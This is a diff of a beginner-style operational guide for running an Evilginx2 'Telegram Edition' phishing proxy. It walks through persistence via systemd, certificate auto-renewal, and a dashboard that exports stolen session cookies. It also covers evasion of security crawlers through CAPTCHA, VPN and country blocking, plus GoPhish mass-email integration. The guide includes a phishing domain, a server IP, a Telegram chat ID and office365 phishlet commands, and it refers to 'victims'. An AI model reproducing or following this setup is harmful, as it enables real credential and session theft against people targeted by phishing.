-> **The `Upgrade` and `Connection` headers are for WebSocket support** — needed for the live feed.
-
-Enable the config:
-
-```bash
-ln -s /etc/nginx/sites-available/evilginx-dashboard /etc/nginx/sites-enabled/
-nginx -t
-systemctl restart nginx
-ufw allow 8443/tcp
-```
-
-Now access: `https://YOUR_SERVER_IP:8443`
-
-#### Option B: Keep HTTP, Use VPN
-
-If exposing HTTP is too risky, run the dashboard behind a VPN (WireGuard, Tailscale, etc.) and only access it from your devices on the VPN.
-
----
-
-### 10.4 — Dashboard Tips & Tricks
-
-#### 💡 Tip 1: Bookmark Key Pages
-Bookmark the Sessions page — you'll check it often.
-
-#### 💡 Tip 2: Use the Search Bar
-On the Sessions page, the search bar filters by:
-- Username
-- IP address
-- Phishlet name
-- Time range
-
-#### 💡 Tip 3: Export Sessions
-Click **"Export"** in the top-right of the Sessions page to download:
-- JSON (full data)
-- CSV (spreadsheet-friendly)
-- Cookies only (for importing into browsers)
-
-#### 💡 Tip 4: Live Updates
-The dashboard auto-refreshes every 5 seconds. You'll see new sessions appear without reloading.
-
-#### 💡 Tip 5: Change the Default Port
-To change the dashboard port, restart Evilginx with a different port:
-```bash
-./evilginx2 -dashboard 0.0.0.0:8080 -dashboard-user admin -dashboard-pass 'YourPassword'
-```
-
-#### 💡 Tip 6: SSH Tunnel for Extra Security
-Instead of exposing the dashboard to the internet, access it via SSH tunnel:
-
-```bash
-# On your local computer:
-ssh -L 5000:127.0.0.1:5000 root@YOUR_SERVER_IP -N
-
-# Then open browser at:
-http://127.0.0.1:5000
-```
-
-This way, only your computer can access the dashboard — even if someone knows the IP and port, they can't connect.
-
-✅ **Dashboard is set up. Move to Phase 11 for auto-start.**
-
----
-
-## PHASE 11 — Auto-Start on Boot (Systemd)
-
-**Time: ~10 minutes | Where: Server terminal**
-
-### 🎯 Goal: Make Evilginx start automatically when the server boots, and auto-restart if it crashes
-
-**Why this matters:** Right now, if your server reboots or Evilginx crashes, everything stops. Systemd is Linux's "always-on" service manager. It will keep Evilginx running 24/7.
-
----
-
-### 11.1 — Stop the Currently Running Evilginx
-
-If Evilginx is running in your SSH session, stop it:
-
-```
-exit
-```
-
-This returns you to your normal terminal.
-
----
-
-### 11.2 — Create a Systemd Service File
+## STEP 47 — Create the Service File
 
 ```bash
 nano /etc/systemd/system/evilginx.service
 ```
 
-Paste this content (replace values with yours):
+**What `nano` is:** A text editor in the terminal. Like Notepad but without a mouse.
+
+In the editor, paste this EXACT text:
 
 ```ini
 [Unit]
-Description=Evilginx3 Telegram Edition
-Documentation=https://github.com/afrikaquality/evilginx2
-After=network.target
+Description=Evilginx2 Telegram Edition — Full Features
+After=network-online.target
+Wants=network-online.target
 
 [Service]
 Type=simple
 User=root
+Group=root
 WorkingDirectory=/root/evilginx2
-ExecStart=/root/evilginx2/evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourStrongPassword123!' -feed
+ExecStart=/root/evilginx2/evilginx2 \
+    -dashboard 0.0.0.0:5000 \
+    -dashboard-user admin \
+    -dashboard-pass mypass123 \
+    -geoip-db /root/.evilginx/GeoIP
 Restart=always
-RestartSec=10
+RestartSec=5
+LimitNOFILE=65535
 StandardOutput=journal
 StandardError=journal
-SyslogIdentifier=evilginx
-
-# Hardening
-NoNewPrivileges=true
-PrivateTmp=true
-ProtectSystem=full
-ProtectHome=true
 
 [Install]
 WantedBy=multi-user.target
 ```
 
-> **⚠️ IMPORTANT:** Change `YourStrongPassword123!` to your actual password.
+**How to paste in nano:**
+1. Right-click in the terminal to paste
+2. Or press `Ctrl+Shift+V`
 
-Save and exit (`Ctrl + O`, `Enter`, `Ctrl + X`).
+**How to save and exit:**
+1. Press `Ctrl+X` (exit)
+2. Type `Y` (yes, save)
+3. Press `Enter` (confirm filename)
 
----
-
-### 11.3 — Reload Systemd and Enable the Service
+## STEP 48 — Enable and Start the Service
 
 ```bash
 systemctl daemon-reload
+```
+
+✅ **Expected:** Nothing.
+
+```bash
 systemctl enable evilginx
 ```
 
-**Expected output:**
+✅ **Expected:**
 ```
 Created symlink /etc/systemd/system/multi-user.target.wants/evilginx.service → /etc/systemd/system/evilginx.service.
 ```
 
----
-
-### 11.4 — Start the Service
+This creates a "start me on boot" link.
 
 ```bash
 systemctl start evilginx
 ```
 
-**Expected output:** Just the prompt (no errors).
+✅ **Expected:** Nothing (or a brief message if already running).
 
----
-
-### 11.5 — Verify It's Running
+## STEP 49 — Verify It's Running
 
 ```bash
 systemctl status evilginx
 ```
 
-**Expected output:**
+✅ **Expected:**
 ```
-● evilginx.service - Evilginx3 Telegram Edition
-     Loaded: loaded (/etc/systemd/system/evilginx.service; enabled; vendor preset: enabled)
-     Active: active (running) since Mon 2026-07-13 01:45:00 UTC; 5s ago
-     Main PID: 12345 (evilginx2)
-      Tasks: 8 (limit: 4915)
-     Memory: 25.6M
-     CPU: 234ms
+● evilginx.service - Evilginx2 Telegram Edition — Full Features
+     Loaded: loaded (/etc/systemd/system/evilginx.service; enabled; preset: enabled)
+     Active: active (running) since Mon 2025-08-25 12:00:00 UTC; 5s ago
+   Main PID: 1234 (evilginx2)
+      Tasks: 10 (limit: 1119)
+     Memory: 25.0M
+        CPU: 150ms
      CGroup: /system.slice/evilginx.service
-             └─12345 /root/evilginx2/evilginx2 -dashboard 0.0.0.0:5000 ...
+             └─1234 /root/evilginx2/evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123 -geoip-db /root/.evilginx/GeoIP
 ```
 
-Look for:
-- ✅ `Active: active (running)` — Service is running
-- ✅ `enabled` — Service starts on boot
-- ✅ Low memory usage (25-50 MB is normal)
+Key things to check:
+- ✅ **Active: active (running)** — it's running
+- ✅ **Loaded: enabled** — it starts on boot
 
-Press `q` to exit the status view.
-
----
-
-### 11.6 — Test the Auto-Restart
-
-Kill the process to verify systemd restarts it:
-
-```bash
-pkill -9 evilginx2
-sleep 5
-systemctl status evilginx
-```
-
-**Expected:** The service should be `active (running)` again. Systemd auto-restarted it within 5-10 seconds.
-
----
-
-### 11.7 — Test Boot Persistence
-
-Reboot the server:
-
-```bash
-reboot
-```
-
-Wait 30 seconds, reconnect via SSH, then check:
-
-```bash
-systemctl status evilginx
-```
-
-**Expected:** Still `active (running)`. ✅
-
----
-
-### 11.8 — View Logs
-
-To see what Evilginx is doing:
+## STEP 50 — Watch the Logs
 
 ```bash
 journalctl -u evilginx -f
 ```
 
-**What you'll see:** Real-time log output. Press `Ctrl + C` to exit.
+**What this does:** Shows live log output from Evilginx (like having the terminal open while it runs).
 
-To see the last 100 lines:
+Look for the same starting messages:
+- `[wld] using wildcard certificate for: *.officialmonsterz.store`
+- `[inf] wildcard certificate loaded..`
+- `[inf] geoip: loaded GeoIP database`
+- `[inf] dashboard: web interface starting on http://0.0.0.0:5000`
+
+Press `Ctrl+C` to stop watching logs.
+
+## STEP 51 — Test Reboot Persistence
 
 ```bash
-journalctl -u evilginx -n 100 --no-pager
+reboot
+```
+
+Wait 30–60 seconds, then reconnect:
+
+```bash
+ssh root@95.133.228.19
+```
+
+Check that Evilginx started automatically:
+
+```bash
+systemctl status evilginx
+```
+
+✅ **Should show:** `active (running)` without you doing anything.
+
+---
+
+# PART 16: CERTIFICATE AUTO-RENEWAL
+
+Let's Encrypt certificates expire after 90 days. We need to renew them automatically.
+
+## STEP 52 — Create the Auth Hook Script
+
+First, create a script that certbot can use to automatically add/remove DNS TXT records via Cloudflare's API.
+
+```bash
+nano /root/evilginx2/certbot-auth.sh
+```
+
+Paste this:
+
+```bash
+#!/bin/bash
+# Certbot DNS-01 auth hook for Cloudflare
+# This script is called by certbot to add/remove TXT records
+
+# Cloudflare API credentials
+CF_API_TOKEN="YOUR_CLOUDFLARE_API_TOKEN"
+CF_ZONE_ID="YOUR_CLOUDFLARE_ZONE_ID"
+
+# DO NOT EDIT BELOW THIS LINE
+ACTION="$1"
+FQDN="$2"
+VALUE="$3"
+
+if [ -z "$CF_API_TOKEN" ] || [ "$CF_API_TOKEN" == "YOUR_CLOUDFLARE_API_TOKEN" ]; then
+    echo "ERROR: Please set your Cloudflare API token in $0"
+    exit 1
+fi
+
+if [ -z "$CF_ZONE_ID" ] || [ "$CF_ZONE_ID" == "YOUR_CLOUDFLARE_ZONE_ID" ]; then
+    echo "ERROR: Please set your Cloudflare Zone ID in $0"
+    exit 1
+fi
+
+# Extract the record name (remove domain suffix)
+RECORD_NAME="_acme-challenge"
+
+if [ "$ACTION" == "present" ]; then
+    # Add TXT record
+    curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records" \
+        -H "Authorization: Bearer $CF_API_TOKEN" \
+        -H "Content-Type: application/json" \
+        --data "{\"type\":\"TXT\",\"name\":\"$RECORD_NAME\",\"content\":\"$VALUE\",\"ttl\":120,\"proxied\":false}" \
+        > /dev/null
+    echo "Added TXT record: $RECORD_NAME = $VALUE"
+elif [ "$ACTION" == "cleanup" ]; then
+    # Delete TXT record
+    RECORD_ID=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records?type=TXT&name=$RECORD_NAME" \
+        -H "Authorization: Bearer $CF_API_TOKEN" \
+        -H "Content-Type: application/json" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['result'][0]['id'] if d['result'] else '')" 2>/dev/null)
+    if [ -n "$RECORD_ID" ]; then
+        curl -s -X DELETE "https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records/$RECORD_ID" \
+            -H "Authorization: Bearer $CF_API_TOKEN" \
+            > /dev/null
+        echo "Deleted TXT record: $RECORD_NAME"
+    fi
+fi
+```
+
+**Save:** `Ctrl+X` → `Y` → `Enter`
+
+Make it executable:
+
+```bash
+chmod +x /root/evilginx2/certbot-auth.sh
+```
+
+### Get Your Cloudflare API Token and Zone ID
+
+**API Token:**
+1. Go to https://dash.cloudflare.com → Profile (top right) → **"API Tokens"**
+2. Click **"Create Token"**
+3. Click **"Use template"** under **"Edit zone DNS"**
+4. Under **"Zone Resources"**, select: `Include → Specific zone → yourdomain.com`
+5. Click **"Continue to summary"** → **"Create Token"**
+6. **COPY THE TOKEN NOW** — it only shows once!
+
+**Zone ID:**
+1. Go to Cloudflare → your domain
+2. In the right sidebar, under **"API"**, you'll see **"Zone ID"**
+3. Copy that string.
+
+Edit the script with YOUR values:
+
+```bash
+nano /root/evilginx2/certbot-auth.sh
+```
+
+Replace:
+- `YOUR_CLOUDFLARE_API_TOKEN` with your actual token
+- `YOUR_CLOUDFLARE_ZONE_ID` with your actual zone ID
+
+**Save:** `Ctrl+X` → `Y` → `Enter`
+
+## STEP 53 — Set Up the Cron Job
+
+A "cron job" is a scheduled task. We'll create one that checks and renews the cert every month.
+
+```bash
+crontab -e
+```
+
+If asked to choose an editor, pick `nano` (option 1 or 2).
+
+Add this line at the bottom:
+
+```cron
+# Renew Let's Encrypt wildcard certificate at 3 AM on the 1st of each month
+0 3 1 * * /usr/bin/certbot renew --manual --preferred-challenges dns --manual-auth-hook /root/evilginx2/certbot-auth.sh --post-hook "cp /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem /root/.evilginx/crt/wildcard/ && cp /etc/letsencrypt/live/officialmonsterz.store/privkey.pem /root/.evilginx/crt/wildcard/ && chmod 644 /root/.evilginx/crt/wildcard/fullchain.pem && chmod 600 /root/.evilginx/crt/wildcard/privkey.pem && systemctl restart evilginx" >> /var/log/cert-renew.log 2>&1
+```
+
+Replace `officialmonsterz.store` with YOUR domain.
+
+**Save:** `Ctrl+X` → `Y` → `Enter`
+
+**Simpler alternative (manual renewal every 2 months):**
+
+If you don't want to use the Cloudflare API, just set a reminder to run this every 60 days:
+
+```cron
+0 3 1 */2 * echo "Time to renew cert manually!" >> /var/log/cert-renew.log
+```
+
+And when you need to renew:
+```bash
+# Delete old TXT record from Cloudflare
+# Run certbot again (same as Step 18)
+certbot certonly --manual --preferred-challenges dns -d '*.officialmonsterz.store' -d officialmonsterz.store
+# Add new TXT record, verify, press Enter
+# Then copy certs again
+cp /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem /root/.evilginx/crt/wildcard/
+cp /etc/letsencrypt/live/officialmonsterz.store/privkey.pem /root/.evilginx/crt/wildcard/
+systemctl restart evilginx
 ```
 
 ---
 
-### 11.9 — Useful Systemd Commands
+# PART 17: ADVANCED FEATURES
 
-| Task | Command |
-|:-----|:--------|
-| Start Evilginx | `systemctl start evilginx` |
-| Stop Evilginx | `systemctl stop evilginx` |
-| Restart Evilginx | `systemctl restart evilginx` |
-| Check status | `systemctl status evilginx` |
-| View live logs | `journalctl -u evilginx -f` |
-| View last 100 log lines | `journalctl -u evilginx -n 100` |
-| Disable auto-start | `systemctl disable evilginx` |
-| Re-enable auto-start | `systemctl enable evilginx` |
+## Feature 1: Cloudflare Turnstile CAPTCHA
 
----
+Adds a "I'm not a robot" challenge before victims see the phishing page. This filters out automated scanners, botnets, and security crawlers.
 
-### 11.10 — Optional: Auto-Start the Live Feed
+### Setup:
 
-If you want the live feed to also auto-start, create another service file:
+1. Go to **https://dash.cloudflare.com** → **Turnstile** (left sidebar, under "Verify")
+2. Click **"Add a site"**
+
+| Field | Value |
+|-------|-------|
+| **Site name** | `evilginx-captcha` (or anything) |
+| **Domain** | `officialmonsterz.store` |
+| **Widget mode** | **Managed** or **Invisible** (both work) |
+| **Pre-clearance setting** | Keep default |
+
+3. Click **"Create"**
+
+4. Copy these TWO keys:
+   - **Site Key:** starts with `0x4AAAA...`
+   - **Secret Key:** starts with `0x4AAAA...`
+
+### To enable in Evilginx:
+
+Edit the systemd service:
+
+```bash
+nano /etc/systemd/system/evilginx.service
+```
+
+Find the `ExecStart` line and add the `-turnstile` flag:
+
+```ini
+ExecStart=/root/evilginx2/evilginx2 \
+    -dashboard 0.0.0.0:5000 \
+    -dashboard-user admin \
+    -dashboard-pass mypass123 \
+    -geoip-db /root/.evilginx/GeoIP \
+    -turnstile 0x4AAAAAAABC123456:0x4AAAAAAABC78901234567890ABCDEF
+```
+
+Replace the keys with YOUR actual keys (SiteKey:SecretKey with a colon between them).
+
+**Save:** `Ctrl+X` → `Y` → `Enter`
+
+Reload and restart:
+
+```bash
+systemctl daemon-reload
+systemctl restart evilginx
+```
+
+Now when someone visits your phishing URL, they'll see a CAPTCHA challenge first.
+
+## Feature 2: Block VPN Visitors
+
+Prevents people connecting through VPNs, proxies, or datacenters from accessing your phishing page.
+
+Edit the service:
+
+```bash
+nano /etc/systemd/system/evilginx.service
+```
+
+Add `-block-vpn`:
+
+```ini
+ExecStart=/root/evilginx2/evilginx2 \
+    -dashboard 0.0.0.0:5000 \
+    -dashboard-user admin \
+    -dashboard-pass mypass123 \
+    -geoip-db /root/.evilginx/GeoIP \
+    -block-vpn
+```
+
+Restart:
+
+```bash
+systemctl daemon-reload
+systemctl restart evilginx
+```
+
+## Feature 3: Block Specific Countries
+
+Block entire countries from seeing your phishing page.
+
+Edit the service:
+
+```bash
+nano /etc/systemd/system/evilginx.service
+```
+
+Add `-block-countries`:
+
+```ini
+ExecStart=/root/evilginx2/evilginx2 \
+    -dashboard 0.0.0.0:5000 \
+    -dashboard-user admin \
+    -dashboard-pass mypass123 \
+    -geoip-db /root/.evilginx/GeoIP \
+    -block-countries RU,CN,IR,KP
+```
+
+**Country codes commonly blocked:**
+
+| Code | Country | Why Block |
+|------|---------|-----------|
+| RU | Russia | High bot traffic |
+| CN | China | Security scanners |
+| IR | Iran | Bot traffic |
+| KP | North Korea | No legitimate traffic |
+| CU | Cuba | Similar |
+| SY | Syria | Similar |
+
+Restart:
+
+```bash
+systemctl daemon-reload
+systemctl restart evilginx
+```
+
+## Feature 4: Live Feed (Real-Time WebSocket)
+
+Shows captured events in real-time in a browser. Requires a separate "evilfeed" process.
+
+### Build the evilfeed:
+
+```bash
+cd /root/evilginx2/evilfeed
+go build -o evilfeed .
+chmod +x evilfeed
+ls -lh evilfeed
+```
+
+✅ **Expected:** A ~7-10MB file.
+
+### Create the evilfeed systemd service:
 
 ```bash
 nano /etc/systemd/system/evilfeed.service
@@ -3160,8 +1885,8 @@ Paste:
 
 ```ini
 [Unit]
-Description=Evilginx Live Feed
-After=evilginx.service
+Description=Evilginx Live Feed WebSocket Server
+After=network.target
 
 [Service]
 Type=simple
@@ -3169,1457 +1894,487 @@ User=root
 WorkingDirectory=/root/evilginx2/evilfeed
 ExecStart=/root/evilginx2/evilfeed/evilfeed
 Restart=always
-RestartSec=10
+RestartSec=5
 
 [Install]
 WantedBy=multi-user.target
 ```
 
-Save and exit. Then:
+**Save:** `Ctrl+X` → `Y` → `Enter`
 
-```bash
-systemctl daemon-reload
-systemctl enable evilfeed
-systemctl start evilfeed
-systemctl status evilfeed
-```
-
-✅ **Evilginx is now running 24/7. Move to Phase 12.**
-
----
-
-## PHASE 12 — Live Feed (Real-Time Session Stream)
-
-**Time: ~10 minutes | Where: Server terminal + Web browser**
-
-### 🎯 Goal: Stream captured sessions in real-time to a separate web interface
-
-**Why this matters:** The live feed shows a real-time ticker of every session as it's captured. Useful for monitoring without checking the main dashboard.
-
----
-
-### 12.1 — Configure the Live Feed
-
-The live feed is already built from Phase 5. Start it:
-
-```bash
-cd /root/evilginx2/evilfeed
-./evilfeed
-```
-
-**Expected output:**
-```
-[inf] evilfeed starting on :1337
-```
-
-**By default, evilfeed listens on port 1337.**
-
-To make it accessible from the web, allow it through the firewall:
+### Open port 1337 in the firewall:
 
 ```bash
 ufw allow 1337/tcp
 ```
 
----
-
-### 12.2 — Access the Live Feed
-
-1. Open a browser
-2. Go to: `http://YOUR_SERVER_IP:1337`
-3. **Example:** `http://95.133.228.114:1337`
-
-**Expected result:** A real-time dashboard showing sessions as they're captured. Each new session appears instantly without page reload.
-
----
-
-### 12.3 — Auto-Start the Live Feed
-
-If you followed Phase 11.10, the live feed is already auto-started.
-
-To verify:
-```bash
-systemctl status evilfeed
-```
-
-✅ **Live feed is running. Move to Phase 13.**
-
----
-
-## PHASE 13 — Auto-Export & Backups
-
-**Time: ~10 minutes | Where: Server terminal + Cron**
-
-### 🎯 Goal: Automatically save sessions to JSON/CSV files, and back up your entire configuration
-
----
-
-### 13.1 — Enable Auto-Export from Evilginx
-
-In the Evilginx console:
-
-```
-auto-export enable json /root/exports/sessions/
-auto-export enable csv /root/exports/sessions/
-```
-
-**What this does:** Every captured session is automatically saved as both a JSON file and a CSV file in `/root/exports/sessions/`.
-
-Create the directory:
-
-```bash
-mkdir -p /root/exports/sessions
-```
-
----
-
-### 13.2 — Verify Auto-Export Works
-
-After capturing a test session, check the exports:
-
-```bash
-ls -lh /root/exports/sessions/
-```
-
-**Expected output:** Files like `session_1_2026-07-13.json` and `session_1_2026-07-13.csv`.
-
-View a JSON file:
-
-```bash
-cat /root/exports/sessions/session_1_*.json | jq .
-```
-
-**Expected output:** Pretty-printed JSON with all session data.
-
----
-
-### 13.3 — Set Up Daily Backups
-
-Create a backup script:
-
-```bash
-nano /root/backup-evilginx.sh
-```
-
-Paste:
-
-```bash
-#!/bin/bash
-# Daily backup of Evilginx config and sessions
-
-BACKUP_DIR="/root/backups/evilginx"
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-
-mkdir -p $BACKUP_DIR
-
-# Backup config
-tar -czf $BACKUP_DIR/config_$TIMESTAMP.tar.gz /root/.evilginx/
-
-# Backup sessions database
-cp /root/.evilginx/evilginx-db.db $BACKUP_DIR/db_$TIMESTAMP.db 2>/dev/null
-
-# Backup exports
-tar -czf $BACKUP_DIR/exports_$TIMESTAMP.tar.gz /root/exports/
-
-# Delete backups older than 30 days
-find $BACKUP_DIR -type f -mtime +30 -delete
-
-echo "[$(date)] Backup completed: $BACKUP_DIR"
-```
-
-Save and exit. Make it executable:
-
-```bash
-chmod +x /root/backup-evilginx.sh
-```
-
----
-
-### 13.4 — Schedule Daily Backups with Cron
-
-```bash
-crontab -e
-```
-
-If prompted to choose an editor, select `nano` (usually option 1).
-
-Add this line at the bottom:
-
-```
-0 2 * * * /root/backup-evilginx.sh >> /var/log/evilginx-backup.log 2>&1
-```
-
-**What this does:** Runs the backup script every day at 2:00 AM.
-
-Save and exit.
-
-Verify it's scheduled:
-
-```bash
-crontab -l
-```
-
-✅ **Backups are scheduled. Move to Phase 14.**
-
----
-
-## PHASE 14 — Updating & Maintenance
-
-**Time: ~10 minutes | Where: Server terminal**
-
-### 🎯 Goal: Keep your Evilginx installation up to date with the latest features and security patches
-
----
-
-### 14.1 — Check Current Version
-
-```bash
-cd /root/evilginx2
-git log -1 --format="%H %s"
-```
-
-This shows the latest commit hash and message.
-
----
-
-### 14.2 — Pull Latest Changes
-
-Before updating, **stop the service**:
-
-```bash
-systemctl stop evilginx
-```
-
-Pull the latest code:
-
-```bash
-cd /root/evilginx2
-git pull origin master
-```
-
-**Expected output:**
-```
-remote: Enumerating objects: XX, done.
-...
-From https://github.com/afrikaquality/evilginx2
-   abc1234..def5678  master     -> origin/master
-Updating abc1234..def5678
-Fast-forward
- core/config.go | 5 ++++-
- 1 file changed, 4 insertions(+), 1 deletion(-)
-```
-
-Rebuild:
-
-```bash
-go build -o evilginx2 .
-```
-
-Restart the service:
-
-```bash
-systemctl start evilginx
-systemctl status evilginx
-```
-
-✅ **Updated.**
-
----
-
-### 14.3 — Weekly Maintenance Checklist
-
-Run these commands **once a week** to keep your server healthy:
-
-```bash
-# Update system packages
-apt update && apt upgrade -y
-
-# Check disk space
-df -h
-
-# Check memory usage
-free -h
-
-# Check Evilginx logs for errors
-journalctl -u evilginx -n 100 --no-pager | grep -i error
-
-# Check failed login attempts (SSH)
-journalctl -u ssh --no-pager | grep "Failed password" | tail -20
-
-# Check open ports
-ss -tulpn
-```
-
----
-
-### 14.4 — Rotate SSL Certificates Automatically
-
-Let's Encrypt certs expire every 90 days. To auto-renew:
-
-```bash
-nano /etc/cron.d/certbot-renew
-```
-
-Paste:
-
-```
-0 0 * * 0 root certbot renew --quiet --post-hook "cp /etc/letsencrypt/live/YOUR_DOMAIN/*.pem /root/.evilginx/wildcard/ && systemctl restart evilginx"
-```
-
-**Replace `YOUR_DOMAIN` with your actual domain.**
-
-Save and exit. This runs `certbot renew` every Sunday at midnight, and if a new cert is issued, copies it to Evilginx's directory and restarts the service.
-
----
-
-## PHASE 15 — GoPhish Integration
-
-**Time: ~20 minutes | Where: Server terminal + GoPhish dashboard**
-
-### 🎯 Goal: Connect Evilginx to GoPhish for sending mass phishing emails with Evilginx landing pages
-
-**What is GoPhish?** An open-source phishing simulation toolkit. It handles email sending, tracking, and reporting.
-
-**Why integrate?** Manually sending phishing emails is slow. GoPhish automates this — you create an email template, target list, and GoPhish sends thousands of emails with your Evilginx phishing URL embedded.
-
----
-
-### 15.1 — Install GoPhish
-
-```bash
-cd /root
-wget -q https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
-unzip gophish-v0.12.1-linux-64bit.zip
-rm gophish-v0.12.1-linux-64bit.zip
-cd gophish
-chmod +x gophish
-```
-
----
-
-### 15.2 — Configure GoPhish
-
-Edit the config:
-
-```bash
-nano config.json
-```
-
-Find the line `"listen_url"` and change it to:
-
-```json
-"listen_url": "127.0.0.1:3333",
-```
-
-**Why 127.0.0.1?** So GoPhish is only accessible via SSH tunnel, not the public internet (more secure).
-
----
-
-### 15.3 — Start GoPhish
-
-```bash
-./gophish
-```
-
-**Expected output:** GoPhish generates a random admin password on first run. Look for:
-
-```
-Please login with the username admin and the password [random_password]
-```
-
-**📝 COPY the password.** Save it.
-
-Press `Ctrl + C` to stop GoPhish (we'll auto-start it later).
-
----
-
-### 15.4 — Create GoPhish Systemd Service
-
-```bash
-nano /etc/systemd/system/gophish.service
-```
-
-Paste:
-
-```ini
-[Unit]
-Description=GoPhish Phishing Simulator
-After=evilginx.service
-
-[Service]
-Type=simple
-User=root
-WorkingDirectory=/root/gophish
-ExecStart=/root/gophish/gophish
-Restart=always
-RestartSec=10
-
-[Install]
-WantedBy=multi-user.target
-```
-
-Save and exit.
+### Enable and start evilfeed:
 
 ```bash
 systemctl daemon-reload
-systemctl enable gophish
-systemctl start gophish
-systemctl status gophish
+systemctl enable --now evilfeed
 ```
 
----
-
-### 15.5 — Access GoPhish via SSH Tunnel
-
-On your **local computer** (not the server), open a terminal:
+### Modify Evilginx service to include `-feed` flag:
 
 ```bash
-ssh -L 3333:127.0.0.1:3333 root@YOUR_SERVER_IP
+nano /etc/systemd/system/evilginx.service
 ```
 
-Keep this terminal open. Then in your browser:
+Add `-feed`:
 
-```
-http://127.0.0.1:3333
-```
-
-Log in with `admin` and the password from Step 15.3.
-
----
-
-### 15.6 — Configure Evilginx → GoPhish Connection
-
-In Evilginx console:
-
-```
-config gophish_admin_url http://127.0.0.1:3333
-config gophish_api_key YOUR_GOPHISH_API_KEY
+```ini
+ExecStart=/root/evilginx2/evilginx2 \
+    -dashboard 0.0.0.0:5000 \
+    -dashboard-user admin \
+    -dashboard-pass mypass123 \
+    -geoip-db /root/.evilginx/GeoIP \
+    -feed
 ```
 
-To get your API key:
-1. In GoPhish dashboard, click your user (top right) → **"Account Settings"**
-2. Find **"API Key"** section
-3. Copy the key
-
-Restart Evilginx:
+Restart:
 
 ```bash
+systemctl daemon-reload
 systemctl restart evilginx
 ```
 
-✅ **GoPhish is integrated.**
+### Access the Live Feed:
+
+Open your browser:
+```
+http://95.133.228.19:1337
+```
 
 ---
 
-## PHASE 16 — Multi-User Dashboard & RBAC
+# PART 18: COMPLETE COMMAND REFERENCE
 
-**Time: ~10 minutes | Where: Web dashboard**
+## Evilginx CLI Commands
 
-### 🎯 Goal: Add team members with role-based access control
+### Configuration Commands
+
+| Command | What It Does | Example |
+|---------|--------------|---------|
+| `config` | Shows current configuration | `config` |
+| `config domain <domain>` | Sets your phishing domain | `config domain officialmonsterz.store` |
+| `config ipv4 external <ip>` | Sets your VPS external IP | `config ipv4 external 95.133.228.19` |
+| `config ipv4 bind <ip>` | Sets bind IP (usually 0.0.0.0) | `config ipv4 bind 0.0.0.0` |
+| `config autocert on/off` | Enable/disable automatic SSL certs | `config autocert off` |
+| `config unauth_url <url>` | Where unauthorized visitors go | `config unauth_url https://www.office365.com` |
+| `config teletoken <token>` | Set Telegram bot token | `config teletoken 8863425004:AAF...` |
+| `config chatid <id>` | Set Telegram chat ID | `config chatid 7545456339` |
+| `config strip_headers on/off` | Enable/disable header stripping | `config strip_headers on` |
+
+### Phishlet Commands
+
+| Command | What It Does | Example |
+|---------|--------------|---------|
+| `phishlets hostname <name> <domain>` | Set phishlet hostname | `phishlets hostname office365 officialmonsterz.store` |
+| `phishlets enable <name>` | Enable a phishlet | `phishlets enable office365` |
+| `phishlets disable <name>` | Disable a phishlet | `phishlets disable office365` |
+| `phishlets hide <name>` | Hide a phishlet (redirect all) | `phishlets hide office365` |
+| `phishlets unhide <name>` | Unhide a phishlet | `phishlets unhide office365` |
+| `phishlets list` | List all phishlets | `phishlets list` |
+
+### Lure Commands
+
+| Command | What It Does | Example |
+|---------|--------------|---------|
+| `lures create <phishlet>` | Create a new lure | `lures create office365` |
+| `lures get-url <index>` | Get the phishing URL | `lures get-url 0` |
+| `lures list` | List all lures | `lures list` |
+| `lures delete <index>` | Delete a lure | `lures delete 0` |
+| `lures edit <index>` | Edit a lure | `lures edit 0` |
+| `lures pause <index>` | Pause a lure | `lures pause 0` |
+| `lures unpause <index>` | Unpause a lure | `lures unpause 0` |
+
+### Blacklist Commands
+
+| Command | What It Does |
+|---------|--------------|
+| `blacklist all` | Blacklist ALL visitors (only whitelisted IPs pass) |
+| `blacklist unauth` | Blacklist only unauthorized visitors |
+| `blacklist noadd` | Don't add to blacklist, just redirect |
+| `blacklist off` | Turn off blacklist entirely |
+
+### System Commands
+
+| Command | What It Does |
+|---------|--------------|
+| `test telegram` | Send test Telegram message |
+| `test-certs` | Test certificate configuration |
+| `sessions` | List active sessions |
+| `sessions <id>` | Show session details |
+| `sessions delete <id>` | Delete a session |
+| `clear` | Clear the terminal screen |
+| `help` | Show all commands |
+| `exit` | Exit Evilginx and save config |
+
+## Systemd Commands
+
+| Command | What It Does |
+|---------|--------------|
+| `systemctl start evilginx` | Start Evilginx |
+| `systemctl stop evilginx` | Stop Evilginx |
+| `systemctl restart evilginx` | Restart Evilginx |
+| `systemctl status evilginx` | Check if Evilginx is running |
+| `systemctl enable evilginx` | Enable auto-start on boot |
+| `systemctl disable evilginx` | Disable auto-start |
+| `journalctl -u evilginx -f` | Watch Evilginx logs live |
+| `journalctl -u evilginx -n 100 --no-pager` | Show last 100 log lines |
+| `systemctl start evilfeed` | Start Live Feed |
+| `systemctl stop evilfeed` | Stop Live Feed |
+| `systemctl status evilfeed` | Check Live Feed status |
+| `journalctl -u evilfeed -f` | Watch Live Feed logs |
+
+## Server Management Commands
+
+| Command | What It Does |
+|---------|--------------|
+| `reboot` | Restart the VPS |
+| `ufw status` | Check firewall rules |
+| `htop` | See running processes (press F10 to quit) |
+| `df -h` | Check disk space |
+| `free -h` | Check memory usage |
+| `uptime` | See how long the server has been running |
 
 ---
 
-### 16.1 — Log Into the Dashboard as Admin
+# PART 19: COMPLETE TROUBLESHOOTING REFERENCE
 
-Go to `http://YOUR_SERVER_IP:5000` and log in.
+## 1. "Can't connect to VPS via SSH"
 
----
+| Possible Cause | Symptom | Fix |
+|----------------|---------|-----|
+| VPS is powered off | `Connection timed out` | Turn on VPS in provider's control panel |
+| Wrong IP | `Connection timed out` | Check correct IP in VPS dashboard |
+| Wrong port | `Connection refused` | SSH uses port 22 by default. Try `ssh -p 22 root@IP` |
+| Firewall blocking | `Connection refused` | Check VPS provider's firewall panel (separate from UFW) |
